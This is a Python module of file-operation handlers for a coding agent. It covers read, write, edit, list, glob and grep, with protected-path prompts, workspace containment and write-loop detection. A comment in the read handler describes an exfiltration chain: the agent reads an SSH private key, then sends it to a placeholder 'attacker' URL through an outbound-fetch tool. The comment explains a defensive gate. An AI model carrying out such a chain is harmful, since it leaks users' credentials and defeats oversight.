"""File operation handlers: read, write, edit (search/replace), list, glob, grep.

All writes pass through the shared editing helpers (sanitize, diff preview,
checkpoint) and the protected-path / auto-approval gates. _normalize_git_style_markers
is a local edit helper kept here with edit_file_content.
"""
import glob as glob_module
import os
import re
from datetime import datetime

from coding_model_server.tool_state import state
from coding_model_server.tool_handlers.chunking import get_chunk_for_display
from coding_model_server.tool_handlers.editing import (
    _create_checkpoint,
    _display_diff,
    _sanitize_generated_content,
)
from coding_model_server.tool_handlers.safety import _is_protected_path, _should_auto_approve
from coding_model_server.tool_handlers.workspace import (
    get_workspace,
    resolve_for_read,
    resolve_for_write,
)


def read_file_content(path):
    """Read content of a local file safely"""
    try:
        # Relative paths resolve against the workspace, not the process CWD.
        # Reads are NOT confined to it — the agent still needs to read source
        # elsewhere for context, and protected paths are gated just below.
        full_path = resolve_for_read(path)
        if not os.path.exists(full_path):
            return f"Error: File not found: {path}"

        # Protected-path gate — always prompts, in every permission mode.
        #
        # WRITE_FILE/EDIT_FILE have gated protected paths for a while; READ_FILE
        # did not, on the reasoning that a read is harmless. It isn't: the agent
        # also has outbound-fetch tools, so "read ~/.ssh/id_rsa" followed by
        # "DEEP_INGEST http://attacker/?d=<key>" is a complete exfiltration
        # primitive, and neither step used to ask. Reading a protected file is
        # the first half of that, so it asks now. Ordinary reads are untouched.
        protected, protect_reason = _is_protected_path(full_path)
        if protected:
            state.print_colored(f"\nAgent wants to read file: {full_path}", state.colors['FAIL'])
            state.print_colored(f"   WARNING: {protect_reason}", state.colors['FAIL'])
            try:
                choice = input(
                    f"{state.colors['BOLD']}Allow read of PROTECTED path? [y/N] > {state.colors['ENDC']}"
                )
            except (EOFError, KeyboardInterrupt):
                return "User cancelled read of protected path."
            if choice.lower() != 'y':
                state.logger.info("Read of protected path denied: %s — %s", full_path, protect_reason)
                return f"Denied: {protect_reason}"

        with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        size = len(content)
        if size > 100000:
            return f"Error: File too large ({size} bytes). Use head/tail via shell or read specific lines."

        output = f"File: {path}\nContent:\n{content}"
        if len(output) > state.config.CHUNK_THRESHOLD:
            return get_chunk_for_display(output, log_path=full_path)
        return output
    except Exception as e:
        return f"Error reading file: {str(e)}"


def write_file_content(payload):
    """Write content to a local file safely.

    Payload format: first line is the path, rest is the content.
    Example:
        /path/to/file.txt
        content goes here
        multiple lines ok
    """
    try:
        lines = payload.split('\n', 1)
        if len(lines) < 2:
            return "Error: WRITE_FILE requires path on first line and content on subsequent lines"

        path = lines[0].strip()
        content = _sanitize_generated_content(lines[1] if len(lines) > 1 else "")

        # Workspace containment. Runs before the permission gates below so it
        # holds in every mode, including yolo — a prompt-based guard would be
        # auto-approved away, which is how the stray write got here originally.
        full_path, ws_error = resolve_for_write(path)
        if ws_error:
            state.logger.warning("WRITE_FILE refused (workspace): %s", path)
            return ws_error
        norm_path = os.path.normpath(full_path)

        # Write-loop detection: prevent agent from rewriting the same file endlessly
        state.write_counts[norm_path] = state.write_counts.get(norm_path, 0) + 1
        if state.write_counts[norm_path] > state.MAX_WRITES_PER_FILE:
            msg = (f"WRITE_FILE refused: '{os.path.basename(path)}' has been written "
                   f"{state.write_counts[norm_path] - 1} times already this session. "
                   f"This looks like a loop. Move on to the next task.")
            state.logger.warning(msg)
            state.print_colored(f"\n[Loop detected] {msg}", state.colors['FAIL'])
            # Return None — NOT a refusal message. Returning a message causes the
            # orchestrator to treat it as tool output and continue the loop forever.
            return None

        # Create parent directories if they don't exist
        parent_dir = os.path.dirname(full_path)
        if parent_dir and not os.path.exists(parent_dir):
            os.makedirs(parent_dir, exist_ok=True)
            state.logger.info("Created directory: %s", parent_dir)

        # Protected path check — always prompts regardless of permission mode
        protected, protect_reason = _is_protected_path(full_path)
        if protected:
            state.print_colored(f"\nAgent wants to write file: {full_path}", state.colors['FAIL'])
            state.print_colored(f"   WARNING: {protect_reason}", state.colors['FAIL'])
            state.print_colored("   Protected path — requires explicit approval.", state.colors['FAIL'])
            try:
                choice = input(f"{state.colors['BOLD']}Allow write to PROTECTED path? [y/N] > {state.colors['ENDC']}")
            except (EOFError, KeyboardInterrupt):
                return "User cancelled write to protected path."
            if choice.lower() != 'y':
                state.logger.info("Write to protected path denied: %s — %s", full_path, protect_reason)
                return f"Denied: {protect_reason}"

        state.logger.info("Writing file: %s (%s bytes)", full_path, len(content))

        # Show diff if overwriting existing file, else preview
        state.print_colored(f"\nAgent wants to write file: {full_path}", state.colors['WARNING'])
        state.print_colored(f"   Content size: {len(content)} bytes", state.colors['WARNING'])

        if os.path.exists(full_path):
            try:
                with open(full_path, 'r', encoding='utf-8', errors='replace') as ef:
                    existing = ef.read()
                _display_diff(existing, content, path)
            except Exception:
                pass  # Fall through to preview if diff fails
        else:
            state.print_colored("   (new file)", state.colors['CYAN'])
            preview_lines = content.split('\n')[:5]
            preview = '\n'.join(preview_lines)
            total_lines = content.count('\n') + 1
            if len(preview_lines) < total_lines:
                preview += f"\n... ({total_lines} total lines)"
            state.print_colored(f"   Preview:\n{preview[:500]}", state.colors['CYAN'])

        if _should_auto_approve('WRITE_FILE'):
            state.print_colored(f"   Auto-approved ({state.permission_mode} mode)", state.colors['GREEN'])
            state.logger.info("Auto-approving file write (%s mode): %s", state.permission_mode, full_path)
            choice = 'y'
        else:
            try:
                choice = input(f"{state.colors['BOLD']}Allow write? [y/N] > {state.colors['ENDC']}")
            except (EOFError, KeyboardInterrupt):
                state.logger.info("File write cancelled by user: %s", full_path)
                return "User cancelled file write."

            if choice.lower() != 'y':
                state.logger.info("File write denied by user: %s", full_path)
                return "User denied file write."

        # Checkpoint before overwriting
        _create_checkpoint(full_path)

        # Create missing parents. A fresh temp workspace is empty, so a path like
        # "src/foo.py" has nowhere to land; before containment this happened to
        # work only because the CWD (the repo) already had the directories.
        # full_path is workspace-contained by now, so this cannot mkdir elsewhere.
        parent = os.path.dirname(full_path)
        if parent:
            os.makedirs(parent, exist_ok=True)

        # Write the file
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)

        state.logger.info("File written successfully: %s", full_path)
        return f"Successfully wrote {len(content)} bytes to {path}"

    except PermissionError as e:
        return f"Error: Permission denied writing to {path}: {str(e)}"
    except Exception as e:
        state.logger.error("Error writing file %s: %s", path, str(e))
        return f"Error writing file: {str(e)}"


def _normalize_git_style_markers(text):
    """Convert git-style SEARCH/REPLACE markers to <<<OLD>>>/<<<NEW>>> format.

    Coding Model models sometimes emit Aider/Cursor-style edit blocks from training data:
        <<<<<<< SEARCH
        old text
        =======
        new text
        >>>>>>> REPLACE
    This normalizes them so edit_file_content can parse them.
    """
    # <<<<<<< SEARCH\n  ->  <<<OLD>>>\n  (preserve the newline after the marker)
    text = re.sub(r'<{1,7}\s*SEARCH\s*>{0,7}\s*\n', '<<<OLD>>>\n', text)
    # =======  (separator between old and new)  ->  <<<NEW>>>
    text = re.sub(r'\n={3,}\s*\n', '\n<<<NEW>>>\n', text)
    # >>>>>>> REPLACE  ->  remove (it's just a closing marker)
    text = re.sub(r'\n>{1,7}\s*REPLACE\s*>{0,7}', '', text)
    return text


def edit_file_content(payload):
    """Edit a file by replacing specific text (search and replace).

    Payload format:
        /path/to/file
        <<<OLD>>>
        text to find (exact match)
        <<<NEW>>>
        replacement text

    Supports multiple replacements in one call by repeating <<<OLD>>>...<<<NEW>>> blocks.
    Also handles git-style <<<<<<< SEARCH / ======= / >>>>>>> REPLACE markers.
    """
    try:
        # Normalize git-style markers before parsing
        payload = _normalize_git_style_markers(payload)

        lines = payload.split('\n', 1)
        if len(lines) < 2:
            return "Error: EDIT_FILE requires path on first line and OLD/NEW blocks"

        path = lines[0].strip()
        edit_content = lines[1] if len(lines) > 1 else ""

        # Workspace containment — same gate as WRITE_FILE. An edit is a write.
        full_path, ws_error = resolve_for_write(path)
        if ws_error:
            state.logger.warning("EDIT_FILE refused (workspace): %s", path)
            return ws_error

        if not os.path.exists(full_path):
            return f"Error: File not found: {path}"

        # Protected path check
        protected, protect_reason = _is_protected_path(full_path)
        if protected:
            state.print_colored(f"\nAgent wants to edit file: {full_path}", state.colors['FAIL'])
            state.print_colored(f"   WARNING: {protect_reason}", state.colors['FAIL'])
            try:
                choice = input(f"{state.colors['BOLD']}Allow edit of PROTECTED path? [y/N] > {state.colors['ENDC']}")
            except (EOFError, KeyboardInterrupt):
                return "User cancelled edit of protected path."
            if choice.lower() != 'y':
                state.logger.info("Edit of protected path denied: %s — %s", full_path, protect_reason)
                return f"Denied: {protect_reason}"

        # Read current file content
        with open(full_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        original_content = content

        # Parse OLD/NEW blocks
        # Pattern: <<<OLD>>>\n...\n<<<NEW>>>\n...
        edit_pattern = r'<<<OLD>>>\n(.*?)\n<<<NEW>>>\n(.*?)(?=\n<<<OLD>>>|$)'
        matches = list(re.finditer(edit_pattern, edit_content, re.DOTALL))

        if not matches:
            # Try alternate format without trailing newline requirement
            edit_pattern = r'<<<OLD>>>(.*?)<<<NEW>>>(.*?)(?=<<<OLD>>>|$)'
            matches = list(re.finditer(edit_pattern, edit_content, re.DOTALL))

        if not matches:
            return "Error: No valid <<<OLD>>>...<<<NEW>>> blocks found. Format:\n<<<OLD>>>\nold text\n<<<NEW>>>\nnew text"

        replacements_made = 0
        for match in matches:
            old_text = match.group(1).strip('\n')
            new_text = _sanitize_generated_content(match.group(2).strip('\n'))

            if old_text not in content:
                state.logger.warning("EDIT_FILE: old_text not found in %s: %s...", path, old_text[:100])
                return f"Error: Text to replace not found in file. Searched for:\n{old_text[:200]}"

            # Count occurrences
            occurrences = content.count(old_text)
            if occurrences > 1:
                state.logger.warning("EDIT_FILE: Multiple occurrences (%s) of old_text in %s", occurrences, path)
                # Still proceed but warn
                state.print_colored(f"   Warning: Found {occurrences} occurrences, replacing all", state.colors['WARNING'])

            content = content.replace(old_text, new_text)
            replacements_made += occurrences

        if content == original_content:
            return "Error: No changes made - old text may not match exactly"

        # Show unified diff
        state.print_colored(f"\nAgent wants to edit file: {full_path}", state.colors['WARNING'])
        state.print_colored(f"   Replacements: {replacements_made}", state.colors['CYAN'])
        old_lines = original_content.split('\n')
        new_lines = content.split('\n')
        state.print_colored(f"   Lines: {len(old_lines)} -> {len(new_lines)}", state.colors['CYAN'])
        _display_diff(original_content, content, path)

        if _should_auto_approve('EDIT_FILE'):
            state.print_colored(f"   Auto-approved ({state.permission_mode} mode)", state.colors['GREEN'])
            state.logger.info("Auto-approving file edit (%s mode): %s", state.permission_mode, full_path)
            choice = 'y'
        else:
            try:
                choice = input(f"{state.colors['BOLD']}Allow edit? [y/N] > {state.colors['ENDC']}")
            except (EOFError, KeyboardInterrupt):
                state.logger.info("File edit cancelled by user: %s", full_path)
                return "User cancelled file edit."

            if choice.lower() != 'y':
                state.logger.info("File edit denied by user: %s", full_path)
                return "User denied file edit."

        # Checkpoint before editing
        _create_checkpoint(full_path)

        # Write the edited content
        with open(full_path, 'w', encoding='utf-8') as f:
            f.write(content)

        state.logger.info("File edited successfully: %s (%s replacements)", full_path, replacements_made)
        return f"Successfully edited {path}: {replacements_made} replacement(s) made"

    except Exception as e:
        state.logger.error("Error editing file %s: %s", path, str(e))
        return f"Error editing file: {str(e)}"


def list_directory(path):
    """List contents of a directory with file info.

    Returns structured listing with file types, sizes, and modification times.
    """
    try:
        # Bare LIST_DIR shows the workspace, not the CWD (which is the repo).
        full_path = resolve_for_read(path)

        if not os.path.exists(full_path):
            return f"Error: Directory not found: {path}"

        if not os.path.isdir(full_path):
            return f"Error: Not a directory: {path}"

        entries = []
        try:
            items = sorted(os.listdir(full_path))
        except PermissionError:
            return f"Error: Permission denied reading directory: {path}"

        for item in items:
            item_path = os.path.join(full_path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                size = stat.st_size if not is_dir else 0
                mtime = datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M')

                if is_dir:
                    entries.append(f"  {item}/")
                else:
                    # Human-readable size
                    if size < 1024:
                        size_str = f"{size}B"
                    elif size < 1024 * 1024:
                        size_str = f"{size // 1024}K"
                    else:
                        size_str = f"{size // (1024 * 1024)}M"
                    entries.append(f"  {item:<40} {size_str:>8}  {mtime}")
            except (OSError, PermissionError):
                entries.append(f"  {item} (inaccessible)")

        result = f"Directory: {full_path}\n"
        result += f"Total: {len(items)} items\n\n"
        result += "\n".join(entries) if entries else "(empty)"

        return result

    except Exception as e:
        state.logger.error("Error listing directory %s: %s", path, str(e))
        return f"Error listing directory: {str(e)}"


def glob_files(pattern):
    """Find files matching a glob pattern.

    Supports patterns like:
        *.swift           - Swift files in current dir
        **/*.swift        - Swift files recursively
        src/**/*.py       - Python files under src/
        /absolute/path/*  - Files in absolute path
    """
    try:
        pattern = pattern.strip()
        if not pattern:
            return "Error: No glob pattern provided"

        # Unrooted patterns glob the workspace, not the CWD (which is the repo).
        if not pattern.startswith('/') and not pattern.startswith('.'):
            if '/' not in pattern or pattern.startswith('**'):
                pattern = os.path.join(get_workspace(), pattern)

        # Expand user home if present
        pattern = os.path.expanduser(pattern)

        # Use recursive glob
        matches = sorted(glob_module.glob(pattern, recursive=True))

        if not matches:
            return f"No files found matching: {pattern}"

        # Limit output to prevent overwhelming responses
        max_results = 200
        truncated = len(matches) > max_results

        result_lines = [f"Found {len(matches)} file(s) matching: {pattern}"]
        if truncated:
            result_lines.append(f"(showing first {max_results})")
        result_lines.append("")

        for match in matches[:max_results]:
            # Show relative path if possible
            try:
                rel_path = os.path.relpath(match)
                if not rel_path.startswith('..'):
                    result_lines.append(f"  {rel_path}")
                else:
                    result_lines.append(f"  {match}")
            except ValueError:
                result_lines.append(f"  {match}")

        if truncated:
            result_lines.append(f"\n... and {len(matches) - max_results} more")

        return "\n".join(result_lines)

    except Exception as e:
        state.logger.error("Error in glob %s: %s", pattern, str(e))
        return f"Error in glob: {str(e)}"


def grep_search(payload):
    """Search for pattern in files.

    Payload format (one of):
        pattern                     - Search pattern in current directory
        pattern|path                - Search pattern in specific path
        pattern|path|options        - With options like -i (case insensitive), -n (line numbers)

    Examples:
        TODO                        - Find TODO in current dir
        def.*init|*.py              - Find 'def.*init' in Python files
        import|src/|i               - Case-insensitive search for 'import' in src/
    """
    try:
        parts = payload.strip().split('|')
        pattern = parts[0].strip() if parts else ""
        path = parts[1].strip() if len(parts) > 1 else "."
        options = parts[2].strip().lower() if len(parts) > 2 else ""

        if not pattern:
            return "Error: No search pattern provided"

        # Expand path
        search_path = os.path.expanduser(path)
        if not os.path.exists(search_path):
            return f"Error: Path not found: {path}"

        # Build regex flags
        flags = re.MULTILINE
        if 'i' in options:
            flags |= re.IGNORECASE

        try:
            regex = re.compile(pattern, flags)
        except re.error as e:
            return f"Error: Invalid regex pattern: {e}"

        results = []
        files_searched = 0
        files_matched = 0
        max_results = 100
        max_files = 500

        # Determine files to search
        if os.path.isfile(search_path):
            files_to_search = [search_path]
        else:
            # Walk directory
            files_to_search = []
            for root, dirs, files in os.walk(search_path):
                # Skip hidden and common non-code directories
                dirs[:] = [d for d in dirs if not d.startswith('.') and d not in
                          ['node_modules', '__pycache__', 'venv', 'env', '.git', 'build', 'dist', 'DerivedData']]

                for filename in files:
                    if filename.startswith('.'):
                        continue
                    files_to_search.append(os.path.join(root, filename))

                    if len(files_to_search) >= max_files:
                        break
                if len(files_to_search) >= max_files:
                    break

        for filepath in files_to_search:
            files_searched += 1
            try:
                # Skip very large files to avoid memory issues
                if os.path.getsize(filepath) > 5 * 1024 * 1024:
                    continue
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()

                matches = list(regex.finditer(content))
                if matches:
                    files_matched += 1
                    lines = content.split('\n')

                    # Get relative path
                    try:
                        rel_path = os.path.relpath(filepath)
                    except ValueError:
                        rel_path = filepath

                    # Precompute newline offsets ONCE so per-match line lookup
                    # is O(log lines) via bisect instead of O(file_size) per
                    # match via content[:match.start()].count('\n').
                    import bisect
                    line_starts = [0]
                    for i, ch in enumerate(content):
                        if ch == '\n':
                            line_starts.append(i + 1)

                    for match in matches[:10]:  # Limit matches per file
                        if len(results) >= max_results:
                            break

                        # bisect_right gives 1-indexed line number directly
                        line_num = bisect.bisect_right(line_starts, match.start())
                        line_content = lines[line_num - 1] if line_num <= len(lines) else ""

                        # Truncate long lines
                        if len(line_content) > 200:
                            line_content = line_content[:200] + "..."

                        results.append(f"{rel_path}:{line_num}: {line_content.strip()}")

                    if len(results) >= max_results:
                        break

            except (IOError, OSError, UnicodeDecodeError):
                continue  # Skip unreadable files

        # Build result
        header = f"Search: '{pattern}' in {path}\n"
        header += f"Files searched: {files_searched}, Files matched: {files_matched}\n"

        if not results:
            return header + "\nNo matches found."

        truncated = len(results) >= max_results
        if truncated:
            header += f"Showing first {max_results} results:\n"

        return header + "\n" + "\n".join(results)

    except Exception as e:
        state.logger.error("Error in grep search: %s", str(e))
        return f"Error in search: {str(e)}"
